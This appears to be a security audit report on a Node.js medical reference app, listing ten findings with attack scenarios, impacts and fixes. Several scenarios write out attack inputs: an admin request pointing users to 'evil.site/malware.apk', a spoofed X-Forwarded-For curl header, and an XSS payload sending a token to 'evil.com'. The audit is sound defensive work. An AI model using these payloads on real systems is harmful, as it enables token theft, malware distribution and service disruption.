# 🔐 Audit 01 — Security (OWASP + Secrets)
> Date: 2026-08-01 | Role: Security Engineer | Mode: Audit-Only

---

## Issue 1
- **File/area:** `server/routes/version.js` line 39
- **Severity:** 🔴 CRITICAL
- **Attack scenario:** Attacker reads source code (GitHub, APK decompile) and finds `drcat_secret_api_key_2026`. They call `PUT /api/admin/version` with `{ "forceUpdateActive": true, "minVersion": "99.0.0", "downloadLinks": { "directServerUrl": "https://evil.site/malware.apk" } }` — instantly locking out all 1,000+ users and redirecting them to a malicious APK.
- **Business impact:** Complete service disruption and supply-chain malware distribution to all app users.
- **Fix:** Remove the hardcoded fallback; require `ADMIN_API_KEY` from env or return HTTP 500 if unset.
- **Code example:**
```js
// BEFORE (dangerous):
const expectedApiKey = process.env.ADMIN_API_KEY || 'drcat_secret_api_key_2026';
// AFTER (safe):
const expectedApiKey = process.env.ADMIN_API_KEY;
if (!expectedApiKey) return res.status(500).json({ error: 'Server misconfiguration.' });
```

---

## Issue 2
- **File/area:** `server/middleware/rate-limit.js` lines 74-78
- **Severity:** 🔴 CRITICAL
- **Attack scenario:** Attacker sends `curl -H "X-Forwarded-For: 127.0.0.1"` from any external IP. `isLocalAddress('127.0.0.1')` returns `true` → all rate limits skipped. Attacker can now enumerate all CAT data (`/api/cats`), hammer the search endpoint, or brute-force the WAF without throttling.
- **Business impact:** Full rate-limit bypass makes all WAF/DDoS protection ineffective against any informed attacker.
- **Fix:** Validate the source socket IP before trusting X-Forwarded-For.
- **Code example:**
```js
// BEFORE (bypassable):
const ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
// AFTER (safe):
const socketIp = (req.socket.remoteAddress || '').replace(/^::ffff:/, '');
const TRUSTED_PROXIES = ['127.0.0.1', '::1'];
const ip = TRUSTED_PROXIES.includes(socketIp)
  ? (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || socketIp
  : socketIp;
```

---

## Issue 3
- **File/area:** `server/routes/suggestions.js` lines 17-58
- **Severity:** 🔴 CRITICAL
- **Attack scenario:** No authentication, no rate limit applied to this specific route (rate-limit middleware runs but at the generic 600 req/min API limit). Attacker scripts 600 requests/min with 50 KB `data` payloads (express limit is 50 MB). After a few minutes: 30+ MB of garbage in `suggestionsCache` in RAM and on disk.
- **Business impact:** Memory exhaustion, disk fill, server crash. Database file grows unbounded.
- **Fix:** Require `x-app-key` header and cap `data` object to 5 KB.
- **Code example:**
```js
app.post('/api/suggestions', async (req, res) => {
  const requestKey = req.headers['x-app-key'];
  if (!requestKey || requestKey !== APP_DATA_KEY) return res.status(403).json({ error: 'Interdit.' });
  const dataStr = JSON.stringify(req.body.data || {});
  if (dataStr.length > 5000) return res.status(413).json({ error: 'Payload trop grand.' });
  // ...rest of handler
});
```

---

## Issue 4
- **File/area:** `server/index.js` lines 241-242
- **Severity:** 🔴 CRITICAL
- **Attack scenario:** CSP `script-src 'unsafe-eval'` means `eval()`, `setTimeout(string)`, `Function()` all execute. If any XSS vector exists (see Issue 5 below), attacker runs arbitrary JS in victims' browsers — steals `localStorage` tokens, reads medical notes, impersonates users to the server.
- **Business impact:** Patient data leakage, session hijacking for all app users.
- **Fix:** Remove `unsafe-eval`; perform an audit of all `eval()`/`Function()` calls (there should be none in a vanilla JS app).
- **Code example:**
```js
// Remove 'unsafe-eval':
"script-src 'self' 'unsafe-inline'",
// Even better — use a nonce:
"script-src 'self' 'nonce-{random}'",
```

---

## Issue 5
- **File/area:** `public/js/utils.js` line 21 (`showToast`)
- **Severity:** 🟠 HIGH
- **Attack scenario:** If any API error message (from a compromised/MITM'd server) contains `<img src=x onerror=fetch('https://evil.com/?t='+localStorage.getItem('dr_cat_admin_token'))>`, and this message is passed to `showToast()`, it executes in the user's browser because `toast.innerHTML = \`...\${message}...\`` is used without sanitization.
- **Business impact:** Session token exfiltration, patient data leakage.
- **Fix:** Use `textContent` for the message element or sanitize with DOMPurify.
- **Code example:**
```js
// BEFORE:
toast.innerHTML = `<i class="fa-solid ${icon}"></i><span class="t-msg">${message}</span>...`;
// AFTER:
const span = toast.querySelector('.t-msg');
span.textContent = message; // safe, no HTML interpretation
```

---

## Issue 6
- **File/area:** `server/config/constants.js` line 1
- **Severity:** 🟠 HIGH
- **Attack scenario:** `APP_DATA_KEY` defaults to `'drcat_pub_2f7a91c4e8'` if `process.env.APP_DATA_KEY` is not set. This key guards `/api/cats` (full database) and `/data/` static files. The key is also baked into the client JavaScript bundle (`public/js/api.js` and the esbuild bundle) — making it visible in browser DevTools. An attacker extracts it and scripts bulk data extraction of the entire CAT database.
- **Business impact:** Full medical content database theft (competitive IP loss, content piracy).
- **Fix:** Document that APP_DATA_KEY is security-by-obscurity only (not a real auth layer), not a true secret — OR replace with proper API authentication (JWT, bearer token) for data endpoints.
- **Code example:** No code change needed — just acknowledge the threat model limitation in comments.

---

## Issue 7
- **File/area:** `server/routes/auth.js` lines 20-21 (IP extraction)
- **Severity:** 🟠 HIGH
- **Attack scenario:** Login brute-force protection uses `req.socket.remoteAddress` as the key. This is correct for direct connections but if the server is ever placed behind a reverse proxy, all clients share the same `remoteAddress` (the proxy IP). All legitimate users could get locked out together after one attacker exhausts the 5-attempt limit.
- **Business impact:** Self-inflicted DoS on admin login if a proxy is ever introduced.
- **Fix:** Use the same X-Forwarded-For safe extraction logic as the hardened rate limiter.

---

## Issue 8
- **File/area:** `server/index.js` lines 224-225
- **Severity:** 🟠 HIGH
- **Attack scenario:** `express.json({ limit: '50mb' })` allows a 50 MB JSON body on ALL routes. An attacker sends a 50 MB JSON body to `/api/suggestions` (which has no specific size check). Node.js buffers the entire body in memory before the route handler can reject it — 10 concurrent requests = 500 MB RAM spike.
- **Business impact:** Memory exhaustion, server OOM on a Termux device with limited RAM.
- **Fix:** Reduce the global limit to `'1mb'` and only apply `'50mb'` to the specific admin PDF upload route which genuinely needs it.
- **Code example:**
```js
app.use(express.json({ limit: '1mb' })); // global
app.post('/api/admin/upload-pdf', express.json({ limit: '50mb' }), async (req, res) => { ... }); // specific
```

---

## Issue 9
- **File/area:** `public/js/api.js` lines 13-44 (fetch monkey-patch)
- **Severity:** 🟡 MEDIUM
- **Attack scenario:** `window.fetch` is monkey-patched globally before any other module runs. If a future third-party script (Font Awesome CDN, PDF.js) calls `fetch`, it goes through the Dr.CAT perf logger which dispatches a `CustomEvent` with the full URL, status, and duration. A malicious browser extension or injected script could listen to `drcat-fetch-event` and exfiltrate all API call metadata.
- **Business impact:** API reconnaissance leakage (which endpoints are called, how often, their status codes).
- **Fix:** Scope the event only to `dr_cat_*` URL patterns or remove the global monkey-patch and use `XMLHttpRequest` interceptors more narrowly.

---

## Issue 10
- **File/area:** `server/routes/pdfs.js` lines 26-33 (PDF upload)
- **Severity:** 🟡 MEDIUM
- **Attack scenario:** `cleanFilename = path.basename(filename)` prevents path traversal. However, no MIME-type validation is performed — only the file extension is checked (`endsWith('.pdf')`). An attacker can upload a ZIP bomb or a JavaScript file renamed to `.pdf`. The file is stored in `/public/pdfs/` and served statically with no Content-Type override. If the browser interprets it as JS, it executes.
- **Business impact:** Server resource exhaustion (ZIP bomb); potential client-side code execution if served without `Content-Disposition: attachment`.
- **Fix:** Validate the first 5 bytes of `fileBuffer` against the PDF magic bytes `%PDF-` before writing; add `Content-Disposition: attachment` response header for all PDF downloads.

---

## Security Positives (No Praise, Just Context)
- PBKDF2+SHA512 with random salt for password hashing ✅
- `timingSafeEqual` used for password comparison ✅  
- Login attempt lockout with TTL cleanup ✅
- Atomic file writes (temp → rename) to prevent corruption ✅
- Audit log for all admin actions ✅
- Helmet.js applied ✅

